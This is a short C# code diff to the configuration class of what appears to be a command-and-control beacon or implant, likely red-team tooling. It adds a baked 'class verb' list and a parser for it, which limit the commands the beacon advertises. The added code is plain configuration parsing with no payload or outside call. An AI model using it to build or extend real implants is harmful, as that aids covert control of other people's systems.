@@ -69,6 +69,15 @@ internal sealed class Config
     /// </summary>
     public TransportProfile Transport { get; set; } = new();
 
+    /// <summary>
+    /// The class verb set baked in at build time (the profile's "verbs" key,
+    /// architecture.md Sec 5.2/5.3). The beacon advertises the intersection of
+    /// this set with the compiled handler registry, so a baked implant never
+    /// claims a verb its class forbids or it cannot run. Empty for a dev binary
+    /// built without a bake: it advertises its full compiled handler set.
+    /// </summary>
+    public IReadOnlyList<string> ClassVerbs { get; set; } = Array.Empty<string>();
+
     /// <summary>True when a kill date was supplied (env or flag or baked).</summary>
     public bool HasKillDate => KillDate != DateTimeOffset.MinValue;
 
@@ -132,6 +141,7 @@ internal sealed class Config
                 RequestTimeout = EnvTimeSpan("ROD_REQUEST_TIMEOUT", TimeSpan.Zero),
                 Headers = ParseHeadersEnv(Env("ROD_HEADERS", string.Empty)),
             },
+            ClassVerbs = ParseVerbList(Env("ROD_VERBS", string.Empty)),
         };
         var killDate = Env("ROD_KILL_DATE", string.Empty);
         if (killDate.Length > 0)
@@ -231,6 +241,16 @@ internal sealed class Config
 
     private static string Env(string key, string fallback)
         => Environment.GetEnvironmentVariable(key) is { Length: > 0 } v ? v : fallback;
+
+    // Splits the comma-separated class verb list the bake emits ("a,b,c") into
+    // the individual verbs, trimming whitespace and dropping empties so a stray
+    // separator never registers a blank verb.
+    private static IReadOnlyList<string> ParseVerbList(string raw)
+    {
+        if (string.IsNullOrWhiteSpace(raw))
+            return Array.Empty<string>();
+        return raw.Split(',', StringSplitOptions.RemoveEmptyEntries | StringSplitOptions.TrimEntries);
+    }
 
     private static TimeSpan EnvTimeSpan(string key, TimeSpan fallback)
     {
